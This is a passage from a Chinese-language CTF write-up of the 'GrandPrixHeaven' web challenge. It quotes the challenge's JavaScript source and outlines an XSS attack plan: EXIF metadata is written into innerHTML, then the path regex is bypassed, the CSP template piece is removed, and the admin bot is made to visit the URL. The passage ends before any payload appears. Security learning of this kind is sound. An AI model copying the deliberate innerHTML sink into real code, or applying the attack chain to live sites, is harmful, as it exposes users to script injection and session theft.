+  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>requester</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Requester</span>(<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;F1&#39;</span>));
+  <span style=color:#66d9ef>try</span> {
+    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>result</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>requester</span>.<span style=color:#a6e22e>makeRequest</span>();
+    <span style=color:#a6e22e>result</span>.<span style=color:#a6e22e>then</span>((<span style=color:#a6e22e>resp</span>) =&gt; {
+        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>resp</span>.<span style=color:#a6e22e>headers</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;content-type&#39;</span>) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;image/jpeg&#39;</span>) {
+          <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>titleElem</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;title-card&#34;</span>);
+          <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>dateElem</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;date-card&#34;</span>);
+          <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>descElem</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;desc-card&#34;</span>);
+          
+          <span style=color:#a6e22e>resp</span>.<span style=color:#a6e22e>arrayBuffer</span>().<span style=color:#a6e22e>then</span>((<span style=color:#a6e22e>imgBuf</span>) =&gt; {
+              <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>tags</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ExifReader</span>.<span style=color:#a6e22e>load</span>(<span style=color:#a6e22e>imgBuf</span>);
+              <span style=color:#a6e22e>descElem</span>.<span style=color:#a6e22e>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>tags</span>[<span style=color:#e6db74>&#39;ImageDescription&#39;</span>].<span style=color:#a6e22e>description</span>;
+              <span style=color:#a6e22e>titleElem</span>.<span style=color:#a6e22e>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>tags</span>[<span style=color:#e6db74>&#39;UserComment&#39;</span>].<span style=color:#a6e22e>description</span>;
+              <span style=color:#a6e22e>dateElem</span>.<span style=color:#a6e22e>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>tags</span>[<span style=color:#e6db74>&#39;ICC Profile Date&#39;</span>].<span style=color:#a6e22e>description</span>;
+          })
+        }
+    })
+  } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>e</span>) {
+    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;an error occurred with the Requester class.&#34;</span>);
+  }
+});
+</code></pre></div><p>可以看到他會讓 browser 依照 <code>F1</code> 這個 param 所設的路徑去取得 <code>https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/&lt;F1></code> 這個網站的內容，如果內容是 jpg 圖片的話，就解析圖片的一些資訊並讓前端顯示對應欄位的資料，這邊可以看到他是用 <code>innerHTML</code> 也就是說會有 <code>XSS</code>。</p><p>至於 <code>apiparser</code> 其實內容差不多。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>addEventListener</span>(<span style=color:#e6db74>&#34;load&#34;</span>, (<span style=color:#a6e22e>event</span>) =&gt; {
+    <span style=color:#a6e22e>params</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>URLSearchParams</span>(window.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>search</span>);
+    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>requester</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Requester</span>(<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;F1&#39;</span>));
+    <span style=color:#66d9ef>try</span> {
+      <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>result</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>requester</span>.<span style=color:#a6e22e>makeRequest</span>();
+      <span style=color:#a6e22e>result</span>.<span style=color:#a6e22e>then</span>((<span style=color:#a6e22e>resp</span>) =&gt; <span style=color:#a6e22e>resp</span>.<span style=color:#a6e22e>json</span>()).<span style=color:#a6e22e>then</span>((<span style=color:#a6e22e>jsonBody</span>) =&gt; {
+        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>titleElem</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;title-card&#34;</span>);
+        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>dateElem</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;date-card&#34;</span>);
+        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>descElem</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;desc-card&#34;</span>);
+        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>imgElem</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;img-card&#34;</span>);
+    
+        <span style=color:#a6e22e>titleElem</span>.<span style=color:#a6e22e>textContent</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>jsonBody</span>.<span style=color:#a6e22e>model</span><span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>jsonBody</span>.<span style=color:#a6e22e>make</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
+        <span style=color:#a6e22e>dateElem</span>.<span style=color:#a6e22e>textContent</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jsonBody</span>.<span style=color:#a6e22e>createdAt</span>;
+        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>jsonBody</span>.<span style=color:#a6e22e>img_id</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>) {
+    	    <span style=color:#a6e22e>imgElem</span>.<span style=color:#a6e22e>src</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>`/media/</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>jsonBody</span>.<span style=color:#a6e22e>img_id</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>;
+	    }
+      })
+    } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>e</span>) {
+      <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;an error occurred with the Requester class.&#34;</span>);
+    }
+  });
+</code></pre></div><p>只是改成用 json 處理並且用 <code>textContent</code> 設定欄位而已，所以要改成用 <code>mediaparser</code> 才會有 <code>XSS</code> 的問題。</p><p>至於如何發 request ，來看一下 <code>retrieve.js</code>。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Requester</span> {
+    <span style=color:#a6e22e>constructor</span>(<span style=color:#a6e22e>url</span>) {
+        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>clean</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>path</span>) =&gt; {
+          <span style=color:#66d9ef>try</span> {
+            <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>path</span>) <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#34;no path&#34;</span>);
+            <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>re</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RegExp(<span style=color:#e6db74>/^[A-z0-9\s_-]+$/i</span>);
+            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>re</span>.<span style=color:#a6e22e>test</span>(<span style=color:#a6e22e>path</span>)) {
+              <span style=color:#75715e>// normalize
+</span><span style=color:#75715e></span>              <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>cleaned</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>replaceAll</span>(<span style=color:#e6db74>/\s/g</span>, <span style=color:#e6db74>&#34;&#34;</span>);
+              <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>cleaned</span>;
+            } <span style=color:#66d9ef>else</span> {
+              <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#34;regex fail&#34;</span>);
+            }
+          } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>e</span>) {
+            <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>e</span>);
+            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;dfv&#34;</span>;
+          }
+          };
+        <span style=color:#a6e22e>url</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>clean</span>(<span style=color:#a6e22e>url</span>);
+        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>url</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>URL</span>(<span style=color:#a6e22e>url</span>, <span style=color:#e6db74>&#39;https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/&#39;</span>);
+      }
+    <span style=color:#a6e22e>makeRequest</span>() {
+        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>fetch</span>(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>url</span>).<span style=color:#a6e22e>then</span>((<span style=color:#a6e22e>resp</span>) =&gt; {
+            <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>resp</span>.<span style=color:#a6e22e>ok</span>){
+                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#39;Error occurred when attempting to retrieve media data&#39;</span>);
+            }
+            <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>resp</span>;
+        });
+    }
+  }
+</code></pre></div><p>可以看到這邊有路徑檢查</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>            <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>path</span>) <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#34;no path&#34;</span>);
+            <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>re</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RegExp(<span style=color:#e6db74>/^[A-z0-9\s_-]+$/i</span>);
+            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>re</span>.<span style=color:#a6e22e>test</span>(<span style=color:#a6e22e>path</span>)) {
+              <span style=color:#75715e>// normalize
+</span><span style=color:#75715e></span>              <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>cleaned</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>replaceAll</span>(<span style=color:#e6db74>/\s/g</span>, <span style=color:#e6db74>&#34;&#34;</span>);
+              <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>cleaned</span>;
+            } <span style=color:#66d9ef>else</span> {
+              <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#34;regex fail&#34;</span>);
+            }
+</code></pre></div><p>由於預設是 apiparser 所以拿到的資料應該會是 json，當成功改成 <code>mediaparser</code> 我們必須要繞過這個路徑檢查來達成存取圖片的目的。</p><p>最後 web server 有一個 route</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/report&#34;</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>url</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>url</span>;
+  <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>typeof</span> <span style=color:#a6e22e>url</span> <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#34;string&#34;</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>url</span>.<span style=color:#a6e22e>startsWith</span>(<span style=color:#e6db74>&#39;https://grandprixheaven-web.2024.ctfcompetition.com/&#39;</span>)) {
+    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>200</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;invalid url&#34;</span>).<span style=color:#a6e22e>end</span>();
+    <span style=color:#66d9ef>return</span>;
+  }
+  <span style=color:#a6e22e>bot</span>.<span style=color:#a6e22e>visit</span>(<span style=color:#a6e22e>url</span>);
+  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;Done!&#34;</span>).<span style=color:#a6e22e>end</span>();
+});
+</code></pre></div><p>因此我們可以知道這題是一個 XSS challenge</p><h3 id=解題-1>解題</h3><p>目標是要新增一台車，並且顯示頁面時要使用 <code>mediaparser</code> 同時 <code>F1</code> param 必須要是上傳的圖片的路徑，且該圖片的資訊要有 XSS payload，且網頁不能有 CSP 否則 XSS 傳出資料時會被 CSP 擋住，最後送這網址給 bot 瀏覽。</p><p>首先我們來看看顯示車的 frontend route</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;/fave/:GrandPrixHeaven&#34;</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>grandPrix</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>Configuration</span>.<span style=color:#a6e22e>findOne</span>({
+    <span style=color:#a6e22e>where</span><span style=color:#f92672>:</span> { <span style=color:#a6e22e>public_id</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>params</span>.<span style=color:#a6e22e>GrandPrixHeaven</span> },
+  });
+  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>grandPrix</span>) <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;ERROR: ID not found&#34;</span> });
+  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>defaultData</span> <span style=color:#f92672>=</span> {
+    <span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;csp&#34;</span>,
+    <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;retrieve&#34;</span>,
+    <span style=color:#ae81ff>2</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;apiparser&#34;</span>,
+    <span style=color:#ae81ff>3</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;head_end&#34;</span>,
+    <span style=color:#ae81ff>4</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;faves&#34;</span>,
+    <span style=color:#ae81ff>5</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;footer&#34;</span>,
+  };
+  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>needleBody</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>defaultData</span>;
+  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>grandPrix</span>.<span style=color:#a6e22e>custom</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>) {
+    <span style=color:#66d9ef>try</span> {
+      <span style=color:#a6e22e>needleBody</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>parse</span>(<span style=color:#a6e22e>grandPrix</span>.<span style=color:#a6e22e>custom</span>);
+      <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>const</span> [<span style=color:#a6e22e>k</span>, <span style=color:#a6e22e>v</span>] <span style=color:#66d9ef>of</span> Object.<span style=color:#a6e22e>entries</span>(<span style=color:#a6e22e>needleBody</span>)) {
+        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>TEMPLATE_PIECES</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#a6e22e>v</span>.<span style=color:#a6e22e>toLowerCase</span>()) <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>isNum</span>(parseInt(<span style=color:#a6e22e>k</span>)) <span style=color:#f92672>||</span> <span style=color:#66d9ef>typeof</span>(<span style=color:#a6e22e>v</span>) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;object&#39;</span>)
+          <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#34;invalid template piece&#34;</span>);
+        <span style=color:#75715e>// don&#39;t be sneaky. We need a CSP!
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> (parseInt(<span style=color:#a6e22e>k</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>v</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;csp&#34;</span>) <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#34;No CSP&#34;</span>);
+      }
+    } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>e</span>) {
+      <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`ERROR IN /fave/:GrandPrixHeaven:\n</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>e</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+      <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;invalid custom body&#34;</span> });
+    }
+  }
+  <span style=color:#a6e22e>needle</span>.<span style=color:#a6e22e>post</span>(
+    <span style=color:#a6e22e>TEMPLATE_SERVER</span>,
+    <span style=color:#a6e22e>needleBody</span>,
+    { <span style=color:#a6e22e>multipart</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>, <span style=color:#a6e22e>boundary</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>BOUNDARY</span> },
+    <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>err</span>, <span style=color:#a6e22e>resp</span>, <span style=color:#a6e22e>body</span>) {
+      <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>err</span>) {
+        <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`ERROR IN /fave/:GrandPrixHeaven:\n</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>e</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>500</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;error&#34;</span> });
+      }
+      <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>200</span>).<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>body</span>);
+    }
+  );
+});
+</code></pre></div><p>我們可以注意到這邊的 template pieces 是可以自己定義的</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>needleBody</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>defaultData</span>;
+  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>grandPrix</span>.<span style=color:#a6e22e>custom</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>) {
+    <span style=color:#66d9ef>try</span> {
+      <span style=color:#a6e22e>needleBody</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>parse</span>(<span style=color:#a6e22e>grandPrix</span>.<span style=color:#a6e22e>custom</span>);
+      <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>const</span> [<span style=color:#a6e22e>k</span>, <span style=color:#a6e22e>v</span>] <span style=color:#66d9ef>of</span> Object.<span style=color:#a6e22e>entries</span>(<span style=color:#a6e22e>needleBody</span>)) {
+        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>TEMPLATE_PIECES</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#a6e22e>v</span>.<span style=color:#a6e22e>toLowerCase</span>()) <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>isNum</span>(parseInt(<span style=color:#a6e22e>k</span>)) <span style=color:#f92672>||</span> <span style=color:#66d9ef>typeof</span>(<span style=color:#a6e22e>v</span>) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;object&#39;</span>)
+          <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#34;invalid template piece&#34;</span>);
+        <span style=color:#75715e>// don&#39;t be sneaky. We need a CSP!
+</span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> (parseInt(<span style=color:#a6e22e>k</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>v</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;csp&#34;</span>) <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#34;No CSP&#34;</span>);
+      }
+    } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>e</span>) {
+      <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`ERROR IN /fave/:GrandPrixHeaven:\n</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>e</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+      <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;invalid custom body&#34;</span> });
+    }
+  }
+</code></pre></div><p>如何定義就要看新增車的 route</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#34;/api/new-car&#34;</span>, <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>response</span> <span style=color:#f92672>=</span> {
+    <span style=color:#a6e22e>img_id</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span>,
+    <span style=color:#a6e22e>config_id</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span>,
+  };
+  <span style=color:#66d9ef>try</span> {
+    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>files</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>files</span>.<span style=color:#a6e22e>image</span>) {
+      <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>reqImg</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>files</span>.<span style=color:#a6e22e>image</span>;
+      <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>reqImg</span>.<span style=color:#a6e22e>mimetype</span> <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#34;image/jpeg&#34;</span>) <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#34;wrong mimetype&#34;</span>);
+      <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>request_img</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>reqImg</span>.<span style=color:#a6e22e>data</span>;
+      <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>saved_img</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>Media</span>.<span style=color:#a6e22e>create</span>({
+        <span style=color:#a6e22e>img</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>request_img</span>,
+        <span style=color:#a6e22e>public_id</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>nanoid</span>.<span style=color:#a6e22e>nanoid</span>(),
+      });
+      <span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>img_id</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>saved_img</span>.<span style=color:#a6e22e>public_id</span>;
+    }
+    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>custom</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>custom</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#34;&#34;</span>;
+    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>saved_config</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>Configuration</span>.<span style=color:#a6e22e>create</span>({
+      <span style=color:#a6e22e>year</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>year</span>,
+      <span style=color:#a6e22e>make</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>make</span>,
+      <span style=color:#a6e22e>model</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>model</span>,
+      <span style=color:#a6e22e>custom</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>custom</span>,
+      <span style=color:#a6e22e>public_id</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>nanoid</span>.<span style=color:#a6e22e>nanoid</span>(),
+      <span style=color:#a6e22e>img_id</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>img_id</span>
+    });
+    <span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>config_id</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>saved_config</span>.<span style=color:#a6e22e>public_id</span>;
+    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>redirect</span>(<span style=color:#e6db74>`/fave/</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>config_id</span><span style=color:#e6db74>}</span><span style=color:#e6db74>?F1=</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>config_id</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+  } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>e</span>) {
+    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`ERROR IN /api/new-car:\n</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>e</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>json</span>({ <span style=color:#a6e22e>error</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;An error occurred&#34;</span> });
+  }
+});
